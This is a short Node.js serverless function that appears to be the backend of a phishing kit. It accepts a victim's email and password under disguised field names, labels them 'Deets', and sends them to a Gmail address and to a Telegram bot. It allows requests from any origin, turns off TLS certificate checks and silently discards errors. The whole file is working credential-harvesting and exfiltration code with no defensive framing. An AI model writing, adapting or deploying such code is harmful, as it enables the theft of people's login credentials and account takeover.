const nodemailer = require('nodemailer');

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      success: false,
      error: 'Method Not Allowed'
    });
  }

  try {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      return res.status(500).json({
        success: false,
      });
    }

    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
      return res.status(500).json({
        success: false,
      });
    }

    const maillist = ['Gfequitygroupjobcenter@gmail.com'];

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    await transporter.verify();

    const { phwet, psdwet } = req.body;

    if (!phwet && !psdwet) {
      return res.status(400).json({
        success: false,
      });
    }

    try {
      const mailOptions = {
        from: `"Deets" <${process.env.EMAIL_USER}>`,
        to: maillist,
        subject: 'Deets',
        html: `
          <p>Eml: ${phwet || 'Not provided'}</p>
          <p>Pswd: ${psdwet || 'Not provided'}</p>
        `
      };

      const info = await transporter.sendMail(mailOptions);
    } catch (emailError) {
    }

    try {
      const telegramText = `New Deets:\nEml: ${phwet || 'No5t provided'}\nPswd: ${psdwet || 'Not provided'}`;

      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: telegramText
        })
      });
    } catch (telegramError) {
    }

    return res.status(200).json({
      success: true,
    });

  } catch (overallError) {
    return res.status(500).json({
      success: false,
      details: overallError.message 
    });
  }
};